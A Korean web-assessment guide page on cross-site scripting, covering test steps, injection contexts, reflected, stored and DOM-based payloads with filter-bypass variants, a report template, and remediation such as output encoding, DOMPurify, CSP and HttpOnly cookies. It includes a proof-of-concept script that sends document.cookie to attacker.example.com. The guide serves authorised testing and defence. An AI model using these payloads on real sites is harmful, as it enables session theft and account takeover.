---
sidebar_position: 10
title: 크로스 사이트 스크립팅 (XSS)
description: 웹 진단 - Cross-Site Scripting (XSS) 점검 절차, 페이로드, 보고서 양식
keywords: [XSS, Cross-Site Scripting, Reflected, Stored, DOM-based, 입력값 검증, OWASP A05]
draft: false
---

# 크로스 사이트 스크립팅 (Cross-Site Scripting, XSS)

> 공격자가 피해자 브라우저에서 임의의 JavaScript를 실행시키는 취약점.
> **세션 탈취 / 권한 도용 / 피싱 / 키로깅**으로 이어질 수 있어 실무 빈도가 가장 높은 항목 중 하나.

## 점검 개요

| 항목 | 내용 |
| :--- | :--- |
| **분류** | OWASP A05:2025 - Injection / KISA 입력값 검증 |
| **CWE** | [CWE-79: Improper Neutralization of Input During Web Page Generation](https://cwe.mitre.org/data/definitions/79.html) |
| **영향도** | 🔴 높음 (세션 쿠키 탈취 가능 시) / 🟡 중간 (Self-XSS 또는 제한된 컨텍스트) |
| **점검 난이도** | 하 (탐지) / 상 (WAF 우회 시) |
| **예상 점검 시간** | 페이지당 10~30분 |

---

## 점검 목적

사용자 입력값이 **응답 페이지(HTML/JS)에 안전하게 인코딩되지 않은 채 출력**되어, 공격자가 임의 스크립트를 삽입하고 다른 사용자의 브라우저에서 실행시킬 수 있는지 확인한다. 성공 시 **세션 쿠키 탈취, 페이지 변조, 피싱, 권한 도용**이 가능하다.

---

## 유형 구분

| 유형 | 특징 | 영향도 |
| :--- | :--- | :--- |
| **Reflected XSS** | 요청 파라미터가 즉시 응답에 반사. 피해자가 공격 링크 클릭해야 발현. | 🟡 중간 |
| **Stored XSS** | 서버 DB/파일에 페이로드 저장 → 다른 사용자가 페이지 열 때마다 발현. | 🔴 높음 |
| **DOM-based XSS** | 서버 응답이 아니라 클라이언트 JS가 `location.hash`, `document.referrer` 등을 안전하지 않게 처리. | 🟡 중간 ~ 🔴 높음 |

---

## 진단 절차

### Step 1. 진입점 식별

사용자 입력이 응답에 반영되는 모든 곳을 후보로:

- URL 파라미터 (`?q=...`, `?search=...`)
- POST 폼 (검색, 댓글, 게시판, 프로필)
- HTTP 헤더 (`User-Agent`, `Referer`, 커스텀 헤더)
- URL 경로 (`/user/<name>` 같은 RESTful)
- URL Fragment (`#...`) → DOM-based 후보
- 파일명 / 메타데이터 (업로드 시)

### Step 2. 반영 여부 확인 (Reflection Probe)

먼저 **고유 마커**를 넣어 응답에 반영되는지 확인:

```
xss12345namgi
```

응답에 그대로 들어가면 → 다음 단계. 인코딩되어 있으면 어떤 형태로 인코딩됐는지 확인.

### Step 3. 컨텍스트 식별

페이로드가 들어가는 위치가 **HTML body**인지, **속성값(attribute)** 안인지, **`<script>` 내부**인지에 따라 페이로드가 달라진다.

| 컨텍스트 | 예시 | 필요한 탈출 |
| :--- | :--- | :--- |
| HTML body | `<div>HERE</div>` | `<script>` 등 새 태그 삽입 |
| 속성값 (큰따옴표) | `<input value="HERE">` | `"` 로 속성 탈출 후 이벤트 핸들러 |
| 속성값 (작은따옴표) | `<input value='HERE'>` | `'` 로 탈출 |
| JS 문자열 내부 | `var x = "HERE"` | `"` / `'` 로 탈출 또는 `</script>` |
| URL 컨텍스트 | `<a href="HERE">` | `javascript:` 스킴 |

### Step 4. 페이로드 삽입 및 실행 확인

컨텍스트에 맞춰 최소 페이로드부터 시도 → 차단 시 우회.

### Step 5. 영향 입증 (PoC)

단순 `alert(1)`이 아니라 **실제 위협 입증**:
- `document.domain` 출력 (Same-origin 확인)
- `document.cookie` 출력 (HttpOnly 여부 확인)
- 외부 서버로 쿠키 전송 시뮬레이션

---

## 페이로드 / 테스트 케이스

### 케이스 1: 기본 탐지 (HTML body 컨텍스트)

```html
<script>alert(document.domain)</script>
```

**판정:** 응답 HTML에 위 태그가 그대로 포함되고, 브라우저에서 alert이 뜨면 취약.

### 케이스 2: 속성값 컨텍스트 탈출

```html
" onmouseover="alert(document.domain)
" autofocus onfocus="alert(document.domain)
```

**예시 응답:** `<input value="" onmouseover="alert(document.domain)">`

### 케이스 3: `<script>` 태그가 필터될 때

```html
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
<details open ontoggle=alert(document.domain)>
<iframe srcdoc="<script>alert(document.domain)</script>">
```

### 케이스 4: 키워드/문자 필터 우회

```html
<!-- 대소문자 변형 -->
<sCrIpT>alert(1)</sCrIpT>

<!-- 공백 대신 / 활용 -->
<img/src=x/onerror=alert(1)>

<!-- 괄호 차단 시 -->
<svg onload=alert`1`>

<!-- 'alert' 단어 차단 시 -->
<svg onload=eval(atob('YWxlcnQoMSk='))>

<!-- HTML 엔티티 인코딩 -->
<a href="javas&#99;ript:alert(1)">click</a>
```

### 케이스 5: DOM-based XSS

```
https://<TARGET>/page#<img src=x onerror=alert(document.domain)>
https://<TARGET>/?redirect=javascript:alert(document.domain)
```

→ 코드에서 `location.hash`, `location.search`, `document.referrer` 등이 `innerHTML`, `document.write`, `eval`로 흘러가는지 확인.

### 케이스 6: 영향 입증용 — 쿠키 탈취 PoC

```html
<script>
fetch('https://attacker.example.com/?c=' + encodeURIComponent(document.cookie));
</script>
```

> ⚠️ **실무 주의**: 실제 외부 송신 PoC는 사전 협의 필수. 가능하면 `document.cookie`를 화면에 표시하거나, 사내 협의된 수신 서버로만 전송.

---

## 취약 판정 기준

다음 중 **하나라도** 해당하면 취약:

- [ ] 페이로드가 응답 HTML/JS에 **무인코딩**으로 포함되어 브라우저에서 JavaScript가 실행됨
- [ ] `document.domain`이 정상 alert 으로 출력됨
- [ ] `document.cookie`가 출력되며 HttpOnly 플래그가 없어 탈취 가능
- [ ] Stored 형태로 저장되어 다른 세션에서도 실행됨

다음 경우는 **취약 아님** 또는 **저영향**:

- [ ] `<`, `>`, `"`, `'`가 모두 HTML 엔티티로 인코딩되어 출력됨 (`&lt;`, `&gt;`)
- [ ] CSP에 의해 인라인 스크립트가 차단되어 실행 불가 (단, CSP 정책 자체의 우회 가능성은 별도 검토)
- [ ] Self-XSS — 본인만 트리거 가능하며 외부 전달 경로 없음

---

## PoC 양식 (보고서 붙여넣기용)

**[Reflected XSS] - 검색 페이지 q 파라미터**

1. `<TARGET>` 로그인 후 검색 페이지(`/search`) 접근
2. URL의 `q` 파라미터에 아래 페이로드 삽입
3. 응답 페이지에서 alert 창 발현 확인

**요청 (Request):**

```http
GET /search?q=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E HTTP/1.1
Host: <TARGET>
Cookie: SESSION=abcd1234
```

**응답 (Response) — 취약 발현 증거:**

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8

<html>
  ...
  <h2>검색 결과: <script>alert(document.domain)</script></h2>
  ...
</html>
```

**확인 사항:**
- 응답 HTML에 `<script>` 태그가 인코딩 없이 그대로 포함됨
- 브라우저에서 페이지 로딩 시 `alert` 창에 도메인이 출력됨 (스크린샷 첨부)
- 응답 헤더에 `Content-Security-Policy` 미설정

---

## 영향도 분석

- **기밀성 (Confidentiality)**: 🔴 세션 쿠키 / 로컬스토리지 / 화면 표시 데이터 탈취 가능
- **무결성 (Integrity)**: 🔴 사용자 화면 변조, 임의 액션 수행 (CSRF 토큰 우회 포함)
- **가용성 (Availability)**: 🟡 사용자 단위 가용성 영향 (리다이렉트, 무한 alert 등)

**비즈니스 임팩트:**
관리자 권한 사용자가 Stored XSS 페이지에 접근할 경우 세션 탈취로 **관리자 계정 도용**까지 이어질 수 있다. 인증된 사용자의 모든 동작을 공격자가 수행 가능하며, 피싱 페이지 삽입으로 자격증명 추가 탈취도 가능하다.

---

## 대응방안

### 개발자 관점

1. **출력 인코딩 (Output Encoding)** — 컨텍스트별로 인코딩 적용:
   - HTML body → HTML 엔티티 인코딩 (`<` → `&lt;`)
   - 속성값 → 속성 인코딩 + 큰따옴표로 감싸기
   - JS 문자열 → JS 유니코드 이스케이프 (`<`)
   - URL → URL 인코딩

2. **안전한 템플릿 엔진 사용** — Auto-escape 기본 활성:
   - React (`{변수}` 사용 시 자동 escape, `dangerouslySetInnerHTML` 사용 금지)
   - Vue (`{{ 변수 }}` 자동 escape, `v-html` 사용 금지)
   - Thymeleaf, Mustache, Twig 등

3. **DOMPurify 등 라이브러리 활용** — HTML 입력을 허용해야 할 때 (Rich text editor 등):
   ```javascript
   import DOMPurify from 'dompurify';
   const clean = DOMPurify.sanitize(userInput);
   ```

4. **`innerHTML`, `document.write`, `eval` 사용 지양** — 대신 `textContent`, `setAttribute` 활용.

### 운영자 관점

1. **Content-Security-Policy (CSP) 헤더 설정** — 인라인 스크립트 차단:
   ```
   Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{random}'; object-src 'none';
   ```

2. **쿠키에 `HttpOnly` 속성 설정** — XSS로 쿠키 탈취 차단.

3. **`X-XSS-Protection` 헤더는 더 이상 권장되지 않음** — CSP로 대체.

4. **WAF 룰 적용** — `<script>`, `onerror=`, `javascript:` 등 패턴 탐지 (보조 수단).

### 안전한 예시 코드

```python
# Python (Jinja2 — 자동 escape)
{{ user_input }}  # 자동으로 HTML escape

# 명시적 escape 필요한 경우
from markupsafe import escape
return f"<div>{escape(user_input)}</div>"
```

```javascript
// JavaScript — innerHTML 대신 textContent
element.textContent = userInput;  // 안전
// element.innerHTML = userInput;   // 위험
```

---

## 참고자료

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [PortSwigger - Cross-site scripting](https://portswigger.net/web-security/cross-site-scripting)
- [PayloadsAllTheThings - XSS Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
- [HTML5 Security Cheatsheet](https://html5sec.org/)
- [DOMPurify](https://github.com/cure53/DOMPurify)
- [CSP Evaluator (Google)](https://csp-evaluator.withgoogle.com/)
